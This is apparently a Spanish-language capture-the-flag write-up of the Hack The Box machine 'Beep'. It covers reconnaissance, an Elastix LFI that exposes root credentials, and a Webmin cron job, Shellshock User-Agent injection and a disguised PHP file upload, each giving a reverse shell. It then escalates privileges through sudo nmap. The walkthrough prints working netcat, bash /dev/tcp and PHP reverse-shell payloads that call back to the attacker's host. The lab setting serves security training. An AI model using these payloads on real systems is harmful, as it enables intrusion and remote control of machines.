I" s<p>El día de hoy vamos a estar resolviendo la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/1.png" alt="" /></p>

<p>Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir.</p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una máquina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.7 -R                               
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.7
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.7
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que &lt;valor&gt; por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con <code class="language-plaintext highlighter-rouge">HTTP</code> y <code class="language-plaintext highlighter-rouge">HTTPS</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/4.png" alt="" /></p>

<p>Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar <code class="language-plaintext highlighter-rouge">fuzzing</code>, no obstante, no vamos a encontrar nada interesante.</p>

<p>Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de <code class="language-plaintext highlighter-rouge">WhatWeb</code>, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.7
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb https://10.10.10.7
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb https://10.10.10.7:10000
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/5.png" alt="" /></p>

<p>Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con <em>SSL</em> que aparece cuando visitamos la página a través del protocolo <code class="language-plaintext highlighter-rouge">HTTPS</code>, el cual no es nada grave, y de hecho lo veremos en un momento.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/6.png" alt="" /></p>

<p>Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por <code class="language-plaintext highlighter-rouge">WhatWeb</code>), nos salta un aviso de que la conexión no es segura, y esto se debe a que el <em>certificado SSL</em> que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a <em>HackTheBox</em>, haremos caso omiso a la advertencia y procederemos a la página web.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/7.png" alt="" /></p>

<p>Lo primero que llama nuestra atención es <code class="language-plaintext highlighter-rouge">Elastix</code>, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con <code class="language-plaintext highlighter-rouge">Asterisk</code>.</p>

<p>Respecto a la tercera página web, el navegador nuevamente nos avisará del <em>certificado SSL</em> autofirmado, aviso, el cual una vez más obviaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/8.png" alt="" /></p>

<p>Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a <code class="language-plaintext highlighter-rouge">Webmin</code>, una herramienta que permite la administración de servicios basados en <em>Unix</em>.</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Como mencioné en un inicio, la máquina <em>Beep</em> cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.</p>

<h4 id="fase-de-explotación---local-file-inclusion"><a href="#header-4"></a>Fase De Explotación - Local File Inclusion</h4>

<p>Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo ninguna de las <a href="https://www.elastix.org/community/threads/default-passwords-not-password.8416/">siguientes</a> credenciales nos es de ayuda para logearnos en el servicio de <code class="language-plaintext highlighter-rouge">Elastix</code></p>

<p>La siguiente idea que podemos probar, sería buscar algún tipo de <em>exploit</em> para el servicio <code class="language-plaintext highlighter-rouge">Elastix</code>; para ello utilizaremos <em>SearchSploit</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit Elastix
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/9.png" alt="" /></p>

<p>En este caso <em>SearchSploit</em> nos muestra algunos <em>exploits</em> interesantes, sin embargo nos vamos a quedar con el que nos permite realizar un <a href="https://mateonitro550.github.io/Local-File-Inclusion-(LFI)"><em>Local File Inclusion (LFI)</em></a>, vulnerabilidad que ya revisamos.</p>

<p>En este caso no nos haría falta descargar el <em>exploit</em>, ya que lo más probable es que nos indique en que ruta podemos aplicar el <em>LFI</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit -x php/webapps/37637.pl
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/10.png" alt="" /></p>

<p>En efecto, pero antes de intentar explotar este <em>LFI</em>, debemos confirmar si en primer lugar existe la primera ruta, <code class="language-plaintext highlighter-rouge">/vtigercrm/</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/11.png" alt="" /></p>

<p>Una vez confirmamos que la ruta existe, podemos pasar a explotar el <em>LFI</em>. Si nos percatamos, se está haciendo uso de un <em>null byte</em>, así como de varios <em>directory path traversal</em>, esto con el fin de leer el archivo <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code>, pero perfectamente podríamos listar cualquier otro archivo del sistema.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/12.png" alt="" /></p>

<p>Leer esto así es un poco complicado, así que podríamos hacer <code class="language-plaintext highlighter-rouge">Ctrl + U</code>, para verlo de mejor manera.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/13.png" alt="" /></p>

<p>El archivo <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code>, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de <code class="language-plaintext highlighter-rouge">Asterisk</code>.</p>

<p>Si recordamos, otro servicio que detectamos con <em>Nmap</em>, fue el servicio <em>SSH</em> en el puerto <code class="language-plaintext highlighter-rouge">22</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/14.png" alt="" /></p>

<p>Por lo que procederemos a autenticarnos con las credenciales encontradas:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/15.png" alt="" /></p>

<p>Al intentar conectarnos por <em>SSH</em>, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/16.png" alt="" /></p>

<p>Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/17.png" alt="" /></p>

<h4 id="fase-de-explotación---webmin"><a href="#header-4"></a>Fase De Explotación - Webmin</h4>

<p><a href="https://mateonitro550.github.io/Shellshock">shellshock</a></p>

<p>Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio <code class="language-plaintext highlighter-rouge">Elastix</code>, podemos hacer lo mismo en el panel de autenticación del servicio <code class="language-plaintext highlighter-rouge">Webmin</code>, pero al igual que ocurrió antes, las <a href="https://help.eset.com/era_deploy_va/64/en-US/index.html?webmin.htm">siguientes</a> credenciales no nos permiten ingresar.</p>

<p>Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún a día de hoy, persiste.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/18.png" alt="" /></p>

<p>Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">aquí</a> tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de <code class="language-plaintext highlighter-rouge">NetCat</code>.</p>

<p>Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/19.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/20.png" alt="" /></p>

<p>Después de darle a <code class="language-plaintext highlighter-rouge">save</code>, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/21.png" alt="" /></p>

<p>De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/22.png" alt="" /></p>

<h4 id="fase-de-explotación---shellshock"><a href="#header-4"></a>Fase De Explotación - Shellshock</h4>

<p>Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al <em>url</em> <code class="language-plaintext highlighter-rouge">/session_login.cgi</code></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/23.png" alt="" /></p>

<p>Esto llama nuestra atención ya que los archivos de extensión <code class="language-plaintext highlighter-rouge">.cgi</code>, o dentro del directorio <code class="language-plaintext highlighter-rouge">/cgi-bin/</code>, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que si la bash es vulnerable, podemos realizar un ataque <a href="https://mateonitro550.github.io/Shellshock">shellshock</a>.</p>

<p>Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del <em>certificado SSL</em> autofirmado, a la hora de utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>, nos va a dar un error.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/24.png" alt="" /></p>

<p>Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga <code class="language-plaintext highlighter-rouge">curl</code>, concretamente el parámetro <code class="language-plaintext highlighter-rouge">-k</code> o <code class="language-plaintext highlighter-rouge">--insecure</code>, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el <code class="language-plaintext highlighter-rouge">shellshock</code> de esta forma, por lo que tendremos que hacerlo de otra manera.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/25.png" alt="" /></p>

<p>Para poder cambiar el <code class="language-plaintext highlighter-rouge">User-Agent</code> de otra forma, podríamos hacerlo a través de <code class="language-plaintext highlighter-rouge">Burp Suite</code>, y así, entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<p>Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde <code class="language-plaintext highlighter-rouge">Burp Suite</code>, con <code class="language-plaintext highlighter-rouge">Ctrl + R</code>, vamos a mandar nuestra petición al <code class="language-plaintext highlighter-rouge">Repeater</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/26.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/27.png" alt="" /></p>

<p>Después, vamos a borrar el contenido que se encuentra en el campo <code class="language-plaintext highlighter-rouge">User-Agent</code>, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la <code class="language-plaintext highlighter-rouge">reverse shell</code> la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio <code class="language-plaintext highlighter-rouge">Webmin</code>; nuevamente, este tipo de <code class="language-plaintext highlighter-rouge">reverse shells</code>, las podemos conseguir <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">aquí</a>.</p>

<p>En primer lugar, desde nuestra máquina de atacantes, a través de <code class="language-plaintext highlighter-rouge">NetCat</code>, tenemos que ponernos en escucha a través de un puerto cualquiera.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p>Y, el código malicioso que vamos a ingresar en el campo <code class="language-plaintext highlighter-rouge">User-Agent</code> será:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>() { :; }; bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/&lt;puertoCualquiera&gt; 0&gt;&amp;1
</code></pre></div></div>

<p>Finalmente, presionaremos el botón <code class="language-plaintext highlighter-rouge">Send</code>, para que emitir nuestra petición.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/28.png" alt="" /></p>

<p>Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.</p>

<h4 id="fase-de-explotación---file-upload-bypass"><a href="#header-4"></a>Fase De Explotación - File Upload Bypass</h4>

<p>Si recordamos, en la fase de explotación a través del uso de un <em>LFI</em>, habíamos descubierto un panel de login de <code class="language-plaintext highlighter-rouge">vtiger CRM</code>; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/29.png" alt="" /></p>

<p>Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado <em>Settings/Company Details</em>, vamos a ver que hay una opción que nos permite cambiar el logo de la compañia, por lo que ya vamos teniendo una idea, de que podemos hacer.</p>

<p>De manera casi similar a la máquina <a href="https://mateonitro550.github.io/Vulnversity-TryHackMe">Vulnversity-TryHackMe</a>, vamos a tener que disfrazar un archivo <code class="language-plaintext highlighter-rouge">.php</code> como <code class="language-plaintext highlighter-rouge">.jpg</code>. No obstante, en este caso será un poco más sencillo ya que no haremos uso de <code class="language-plaintext highlighter-rouge">Burp Suite</code> (aunque podríamos); lo único que vamos a hacer es añadir la extensión <code class="language-plaintext highlighter-rouge">.jpg</code> a nuestra <code class="language-plaintext highlighter-rouge">reverseShell.php</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/30.png" alt="" /></p>

<p>Podríamos utilizar la <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"><em>reverse shell</em></a> que nos provee <code class="language-plaintext highlighter-rouge">pentestmonkey</code> (para lo cual debemos modificar el campo <em>ip</em>, y colocar la nuestra, y si quisiéramos el campo <em>port</em>), o bien, crear nuestra propia <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nb">system</span><span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Y al igual que en los casos anteriores, previo a darle a <code class="language-plaintext highlighter-rouge">Save</code>, debemos de estar en escucha a través de <code class="language-plaintext highlighter-rouge">NetCat</code>, por el puerto que hayamos indicado en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/31.png" alt="" /></p>

<p>Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, por lo que ahora si debemos de realizar la escalada de privilegios.</p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, nos es posible leer la flag del usuario con bajos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/32.png" alt="" /></p>

<p>Para conseguir la flag del usuario con máximos privilegios, al ser el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejectuar algunos binarios haciendo uso de <code class="language-plaintext highlighter-rouge">sudo</code>, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/33.png" alt="" /></p>

<p>La mejor forma para abusar de algún binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejectuar como root.</p>

<p>En este caso, tenemos un abanico de oportunidades, tenemos binarios como <code class="language-plaintext highlighter-rouge">chmod</code>, <code class="language-plaintext highlighter-rouge">chown</code>, <code class="language-plaintext highlighter-rouge">service</code>, <code class="language-plaintext highlighter-rouge">yum</code>, y el binario que vamos a explotar en esta ocasión: <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<p>Para explotar el binario <code class="language-plaintext highlighter-rouge">nmap</code>, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap --interactive
nmap&gt; !sh
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/34.png" alt="" /></p>

<p>Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/35.png" alt="" /></p>
:ET